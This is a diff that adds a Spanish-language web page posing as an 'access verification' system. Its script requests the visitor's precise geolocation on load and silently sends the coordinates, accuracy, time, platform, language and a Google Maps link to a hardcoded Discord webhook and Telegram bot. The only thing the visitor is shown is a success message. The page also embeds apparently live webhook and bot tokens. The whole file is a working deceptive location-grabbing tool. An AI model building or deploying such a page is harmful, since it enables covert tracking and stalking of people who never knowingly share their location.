@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Acceso</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .icon {
+            font-size: 72px;
+            margin-bottom: 25px;
+            animation: pulse 2s infinite;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.1));
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        h1 {
+            color: #333;
+            font-size: 26px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        #msg {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.7;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader.active {
+            display: block;
+        }
+
+        .status-icon {
+            font-size: 48px;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .status-icon.show {
+            display: block;
+            animation: scaleIn 0.3s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #999;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🔐</div>
+        <h1>Verificación de Acceso</h1>
+        <p id="msg">Iniciando proceso de verificación...</p>
+        <div class="loader" id="loader"></div>
+        <div class="status-icon" id="statusIcon"></div>
+        <div class="footer">Sistema de verificación segura</div>
+    </div>
+
+    <script>
+        // --- CONFIGURACIÓN ---
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk";
+        const TELEGRAM_TOKEN = '8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU';
+        const CHAT_ID = '7542699747';
+        // ---------------------
+
+        window.onload = () => {
+            actualizarEstado("Solicitando permisos necesarios...");
+            document.getElementById("loader").classList.add("active");
+            
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(enviarDatos, manejarError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                mostrarError("Este navegador no es compatible con el sistema de verificación.");
+            }
+        };
+
+        async function enviarDatos(pos) {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const timestamp = new Date().toLocaleString('es-ES', { 
+                timeZone: 'America/Santo_Domingo',
+                dateStyle: 'full',
+                timeStyle: 'long'
+            });
+            
+            // Obtener información adicional
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            
+            // Mensaje para Discord
+            const discordMessage = {
+                content: `🔔 **Nueva Verificación Completada**`,
+                embeds: [{
+                    title: "📍 Detalles de Acceso",
+                    color: 5814783,
+                    fields: [
+                        {
+                            name: "Coordenadas",
+                            value: `\`${latitude}, ${longitude}\``,
+                            inline: false
+                        },
+                        {
+                            name: "Precisión",
+                            value: `${Math.round(accuracy)}m`,
+                            inline: true
+                        },
+                        {
+                            name: "Fecha y Hora",
+                            value: timestamp,
+                            inline: false
+                        },
+                        {
+                            name: "Navegador",
+                            value: `${platform} - ${language}`,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Ver Mapa",
+                            value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de Verificación"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Mensaje para Telegram
+            const telegramMessage = `🔔 *Nueva Verificación Completada*\n\n` +
+                `📍 *Coordenadas:* \`${latitude}, ${longitude}\`\n` +
+                `📏 *Precisión:* ${Math.round(accuracy)}m\n` +
+                `🕐 *Fecha:* ${timestamp}\n` +
+                `💻 *Sistema:* ${platform}\n` +
+                `🌐 *Idioma:* ${language}\n\n` +
+                `🗺️ [Ver en Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
+
+            try {
+                // Enviar a Discord
+                const discordPromise = fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(discordMessage)
+                });
+
+                // Enviar a Telegram
+                const telegramPromise = fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: telegramMessage,
+                        parse_mode: "Markdown",
+                        disable_web_page_preview: false
+                    })
+                });
+
+                // Esperar ambas peticiones
+                await Promise.all([discordPromise, telegramPromise]);
+                
+                mostrarExito();
+            } catch (error) {
+                mostrarError("Error al procesar la verificación.");
+            }
+        }
+
+        function manejarError(error) {
+            let mensaje = "No se pudo completar la verificación. ";
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    mensaje += "Permisos denegados.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    mensaje += "Información no disponible.";
+                    break;
+                case error.TIMEOUT:
+                    mensaje += "Tiempo de espera agotado.";
+                    break;
+                default:
+                    mensaje += "Error desconocido.";
+            }
+            
+            mostrarError(mensaje);
+        }
+
+        function mostrarExito() {
+            document.getElementById("loader").classList.remove("active");
+            const statusIcon = document.getElementById("statusIcon");
+            statusIcon.textContent = "✅";
+            statusIcon.classList.add("show");
+            actualizarEstado("Verificación completada exitosamente.");
+            
+            // Opcional: redirigir después de 2 segundos
+            // setTimeout(() => { window.location.href = "https://tu-sitio.com"; }, 2000);
+        }
+
+        function mostrarError(mensaje) {
+            document.getElementById("loader").classList.remove("active");
+            const statusIcon = document.getElementById("statusIcon");
+            statusIcon.textContent = "❌";
+            statusIcon.classList.add("show");
+            actualizarEstado(mensaje);
+        }
+
+        function actualizarEstado(txt) {
+            document.getElementById("msg").innerText = txt;
+        }
+    </script>
+</body>
+</html>
